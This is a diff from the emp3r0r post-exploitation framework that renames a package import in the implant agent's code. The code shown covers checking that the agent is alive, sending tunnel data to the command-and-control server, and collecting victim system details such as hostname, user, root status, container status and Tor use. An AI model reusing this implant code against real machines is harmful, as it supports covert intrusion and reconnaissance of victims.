@@ -15,13 +15,13 @@ import (
 	"strings"
 
 	"github.com/jaypipes/ghw"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // is the agent alive?
-// connect to emp3r0r_data.SocketName, send a message, see if we get a reply
+// connect to emp3r0r_def.SocketName, send a message, see if we get a reply
 func IsAgentAlive(c net.Conn) bool {
 	log.Println("Testing if agent is alive...")
 	defer c.Close()
@@ -67,8 +67,8 @@ func IsAgentAlive(c net.Conn) bool {
 }
 
 // Send2CC send TunData to CC
-func Send2CC(data *emp3r0r_data.MsgTunData) error {
-	out := json.NewEncoder(emp3r0r_data.CCMsgConn)
+func Send2CC(data *emp3r0r_def.MsgTunData) error {
+	out := json.NewEncoder(emp3r0r_def.CCMsgConn)
 
 	err := out.Encode(data)
 	if err != nil {
@@ -78,9 +78,9 @@ func Send2CC(data *emp3r0r_data.MsgTunData) error {
 }
 
 // CollectSystemInfo build system info object
-func CollectSystemInfo() *emp3r0r_data.Emp3r0rAgent {
+func CollectSystemInfo() *emp3r0r_def.Emp3r0rAgent {
 	log.Println("Collecting system info for checking in")
-	var info emp3r0r_data.Emp3r0rAgent
+	var info emp3r0r_def.Emp3r0rAgent
 	osinfo := GetOSInfo()
 	info.GOOS = runtime.GOOS
 
@@ -100,7 +100,7 @@ func CollectSystemInfo() *emp3r0r_data.Emp3r0rAgent {
 	info.Tag = RuntimeConfig.AgentTag // use hostid
 	info.Hostname = hostname
 	info.Name = strings.Split(info.Tag, "-agent")[0]
-	info.Version = emp3r0r_data.Version
+	info.Version = emp3r0r_def.Version
 	info.Kernel = osinfo.Kernel
 	info.Arch = osinfo.Architecture
 	info.CPU = util.GetCPUInfo()
@@ -109,7 +109,7 @@ func CollectSystemInfo() *emp3r0r_data.Emp3r0rAgent {
 	info.Hardware = util.CheckProduct(info.Product)
 	info.Container = CheckContainer()
 	setC2Transport()
-	info.Transport = emp3r0r_data.Transport
+	info.Transport = emp3r0r_def.Transport
 
 	// have root?
 	info.HasRoot = HasRoot()
@@ -126,7 +126,7 @@ func CollectSystemInfo() *emp3r0r_data.Emp3r0rAgent {
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
 
 	// is cc on tor?
-	info.HasTor = tun.IsTor(emp3r0r_data.CCAddress)
+	info.HasTor = tun.IsTor(emp3r0r_def.CCAddress)
 
 	// has internet?
 	if !RuntimeConfig.DisableNCSI {
